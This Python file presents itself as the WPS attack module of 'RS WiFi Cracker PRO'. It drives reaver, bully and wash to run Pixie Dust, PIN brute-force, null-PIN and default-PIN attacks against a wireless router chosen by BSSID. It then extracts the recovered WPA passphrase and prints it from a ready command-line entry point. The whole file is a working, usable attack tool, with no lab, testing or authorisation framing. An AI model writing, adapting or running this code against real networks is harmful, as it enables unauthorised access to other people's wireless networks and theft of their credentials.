#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
RS WiFi Cracker PRO - WPS Attack Module
WPS Pixie Dust, PIN Brute Force, and related attacks
"""

import os
import re
import time
import subprocess
import threading
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass
from datetime import datetime
import queue


@dataclass
class WPSResult:
    """WPS attack result"""
    success: bool
    bssid: str
    password: str = ""
    pin: str = ""
    method: str = ""
    time_taken: float = 0.0
    error: str = ""
    details: Dict = None


class WPSAttacker:
    """WPS Attack Suite"""
    
    # Common default PINs
    DEFAULT_PINS = [
        '12345670', '00000000', '11111111', '22222222', '33333333',
        '44444444', '55555555', '66666666', '77777777', '88888888',
        '99999999', '12345678', '87654321', '00000001', '12345098',
        '01234567', '98765432', '56789012', '45678901', '34567890',
    ]
    
    def __init__(self, interface: str):
        self.interface = interface
        self.process = None
        self.stop_flag = False
        self.results: List[WPSResult] = []
        self.pin_queue = queue.Queue()
        self.stats = {
            'attacks_launched': 0,
            'attacks_successful': 0,
            'pins_tried': 0,
            'time_total': 0.0
        }
    
    def attack(self, bssid: str, attack_type: str = "auto", 
               options: Dict = None) -> WPSResult:
        """Main attack dispatcher"""
        self.stats['attacks_launched'] += 1
        start_time = time.time()
        options = options or {}
        
        if attack_type == "pixie":
            result = self._pixie_dust(bssid)
        elif attack_type == "brute":
            result = self._brute_force(bssid, options.get('delay', 1))
        elif attack_type == "null":
            result = self._null_pin(bssid)
        elif attack_type == "custom":
            result = self._custom_pin(bssid, options.get('pin'))
        elif attack_type == "auto":
            result = self._auto_detect(bssid)
        else:
            result = WPSResult(success=False, bssid=bssid, error="Unknown attack type")
        
        result.time_taken = time.time() - start_time
        self.results.append(result)
        
        if result.success:
            self.stats['attacks_successful'] += 1
        
        return result
    
    def _pixie_dust(self, bssid: str) -> WPSResult:
        """Pixie Dust attack - exploits WPS design flaw"""
        try:
            cmd = ['sudo', 'reaver', '-i', self.interface, '-b', bssid,
                   '-vv', '-K', '-c', '-d', '0']
            
            self.process = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
            )
            
            output_lines = []
            password = None
            pin = None
            
            start_time = time.time()
            timeout = 300  # 5 minutes max
            
            while time.time() - start_time < timeout:
                if self.stop_flag:
                    self.process.terminate()
                    return WPSResult(success=False, bssid=bssid, error="Stopped by user")
                
                line = self.process.stdout.readline()
                if not line:
                    break
                
                output_lines.append(line)
                
                # Parse for PIN
                if 'WPS PIN' in line:
                    match = re.search(r'WPS PIN:\s*(\d+)', line)
                    if match:
                        pin = match.group(1)
                
                # Parse for password
                if 'WPA PSK' in line:
                    match = re.search(r'WPA PSK:\s*[\'"]?([^\s\'"]+)', line)
                    if match:
                        password = match.group(1)
                        self.process.terminate()
                        break
                
                # Check for WPS lock
                if 'WPSLock' in line or 'locked' in line.lower():
                    self.process.terminate()
                    return WPSResult(
                        success=False, bssid=bssid, 
                        error="WPS locked",
                        details={'output': ''.join(output_lines)}
                    )
            
            if password:
                return WPSResult(
                    success=True, bssid=bssid, 
                    password=password, pin=pin, 
                    method='pixie_dust'
                )
            
            return WPSResult(
                success=False, bssid=bssid, 
                error="Pixie Dust failed - router not vulnerable",
                details={'output': ''.join(output_lines[-20:])}
            )
            
        except FileNotFoundError:
            return WPSResult(success=False, bssid=bssid, error="reaver not found")
        except Exception as e:
            return WPSResult(success=False, bssid=bssid, error=str(e))
    
    def _brute_force(self, bssid: str, delay: int = 1) -> WPSResult:
        """WPS PIN brute force attack"""
        try:
            cmd = ['sudo', 'reaver', '-i', self.interface, '-b', bssid,
                   '-vv', '-d', str(delay), '-c', '-S']
            
            self.process = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
            )
            
            password = None
            pin = None
            pins_tried = 0
            
            while not self.stop_flag:
                line = self.process.stdout.readline()
                if not line:
                    break
                
                # Count PIN attempts
                if 'Trying pin' in line.lower() or 'pin attempt' in line.lower():
                    pins_tried += 1
                    self.stats['pins_tried'] += 1
                
                # Parse for PIN
                if 'WPS PIN' in line:
                    match = re.search(r'WPS PIN:\s*(\d+)', line)
                    if match:
                        pin = match.group(1)
                
                # Parse for password
                if 'WPA PSK' in line:
                    match = re.search(r'WPA PSK:\s*[\'"]?([^\s\'"]+)', line)
                    if match:
                        password = match.group(1)
                        self.process.terminate()
                        break
                
                # Check for lock
                if 'WPSLock' in line or 'locked' in line.lower():
                    self.process.terminate()
                    return WPSResult(
                        success=False, bssid=bssid,
                        error=f"WPS locked after {pins_tried} PINs",
                        method='brute_force'
                    )
            
            if password:
                return WPSResult(
                    success=True, bssid=bssid,
                    password=password, pin=pin,
                    method='brute_force',
                    details={'pins_tried': pins_tried}
                )
            
            return WPSResult(
                success=False, bssid=bssid,
                error="Brute force failed",
                method='brute_force',
                details={'pins_tried': pins_tried}
            )
            
        except FileNotFoundError:
            return WPSResult(success=False, bssid=bssid, error="reaver not found")
        except Exception as e:
            return WPSResult(success=False, bssid=bssid, error=str(e))
    
    def _null_pin(self, bssid: str) -> WPSResult:
        """Null PIN attack"""
        try:
            # Try null/empty PIN
            cmd = ['sudo', 'reaver', '-i', self.interface, '-b', bssid,
                   '-vv', '-p', '', '-c']
            
            self.process = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
            )
            
            output, _ = self.process.communicate(timeout=30)
            
            if 'WPA PSK' in output:
                match = re.search(r'WPA PSK:\s*[\'"]?([^\s\'"]+)', output)
                if match:
                    return WPSResult(
                        success=True, bssid=bssid,
                        password=match.group(1),
                        method='null_pin'
                    )
            
            return WPSResult(
                success=False, bssid=bssid,
                error="Null PIN failed",
                method='null_pin'
            )
            
        except Exception as e:
            return WPSResult(success=False, bssid=bssid, error=str(e))
    
    def _custom_pin(self, bssid: str, pin: str) -> WPSResult:
        """Try specific PIN"""
        if not pin:
            return WPSResult(success=False, bssid=bssid, error="No PIN provided")
        
        try:
            cmd = ['sudo', 'reaver', '-i', self.interface, '-b', bssid,
                   '-vv', '-p', pin, '-c']
            
            self.process = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
            )
            
            output, _ = self.process.communicate(timeout=60)
            
            if 'WPA PSK' in output:
                match = re.search(r'WPA PSK:\s*[\'"]?([^\s\'"]+)', output)
                if match:
                    return WPSResult(
                        success=True, bssid=bssid,
                        password=match.group(1),
                        pin=pin,
                        method='custom_pin'
                    )
            
            return WPSResult(
                success=False, bssid=bssid,
                error="Custom PIN failed",
                method='custom_pin',
                details={'pin_tried': pin}
            )
            
        except Exception as e:
            return WPSResult(success=False, bssid=bssid, error=str(e))
    
    def _auto_detect(self, bssid: str) -> WPSResult:
        """Auto-detect and exploit WPS vulnerability"""
        # Try default PINs first
        for pin in self.DEFAULT_PINS:
            if self.stop_flag:
                return WPSResult(success=False, bssid=bssid, error="Stopped")
            
            result = self._custom_pin(bssid, pin)
            if result.success:
                result.method = 'auto_default'
                return result
        
        # Try Pixie Dust
        result = self._pixie_dust(bssid)
        if result.success:
            return result
        
        # Try brute force with low delay
        result = self._brute_force(bssid, delay=0)
        
        return result
    
    def _bully_attack(self, bssid: str, channel: int) -> WPSResult:
        """Use bully for WPS attack (alternative to reaver)"""
        try:
            cmd = ['sudo', 'bully', '-b', bssid, '-c', str(channel),
                   self.interface, '-v', '3']
            
            self.process = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
            )
            
            password = None
            pin = None
            
            while not self.stop_flag:
                line = self.process.stdout.readline()
                if not line:
                    break
                
                if 'PIN' in line and ':' in line:
                    match = re.search(r'PIN:\s*(\d+)', line)
                    if match:
                        pin = match.group(1)
                
                if 'PSK' in line and ':' in line:
                    match = re.search(r'PSK:\s*[\'"]?([^\s\'"]+)', line)
                    if match:
                        password = match.group(1)
                        self.process.terminate()
                        break
            
            if password:
                return WPSResult(
                    success=True, bssid=bssid,
                    password=password, pin=pin,
                    method='bully'
                )
            
            return WPSResult(
                success=False, bssid=bssid,
                error="Bully attack failed",
                method='bully'
            )
            
        except FileNotFoundError:
            return WPSResult(success=False, bssid=bssid, error="bully not found")
        except Exception as e:
            return WPSResult(success=False, bssid=bssid, error=str(e))
    
    def scan_wps(self, bssid: str) -> Dict:
        """Scan for WPS capabilities"""
        try:
            cmd = ['sudo', 'wash', '-i', self.interface, '-b', bssid]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            
            wps_info = {
                'enabled': 'WPS' in result.stdout,
                'locked': 'Locked' in result.stdout or 'WPSLock' in result.stdout,
                'version': '',
                'vulnerable': False
            }
            
            # Parse version
            match = re.search(r'Ver\s*:\s*(\d+\.\d+)', result.stdout)
            if match:
                wps_info['version'] = match.group(1)
            
            # Check vulnerability
            if wps_info['enabled'] and not wps_info['locked']:
                wps_info['vulnerable'] = True
            
            return wps_info
            
        except Exception as e:
            return {'enabled': False, 'error': str(e)}
    
    def stop(self):
        """Stop ongoing attack"""
        self.stop_flag = True
        if self.process:
            self.process.terminate()
    
    def get_stats(self) -> Dict:
        """Get attack statistics"""
        return self.stats.copy()
    
    def get_results(self) -> List[WPSResult]:
        """Get all results"""
        return self.results.copy()


if __name__ == '__main__':
    import sys
    
    if len(sys.argv) < 3:
        print("Usage: python wps_attack.py <interface> <bssid> [attack_type]")
        print("Attack types: pixie, brute, null, auto")
        sys.exit(1)
    
    interface = sys.argv[1]
    bssid = sys.argv[2]
    attack_type = sys.argv[3] if len(sys.argv) > 3 else 'auto'
    
    attacker = WPSAttacker(interface)
    
    print(f"Starting {attack_type} WPS attack on {bssid}...")
    result = attacker.attack(bssid, attack_type)
    
    if result.success:
        print(f"\nPassword found: {result.password}")
        if result.pin:
            print(f"PIN: {result.pin}")
    else:
        print(f"\nFailed: {result.error}")
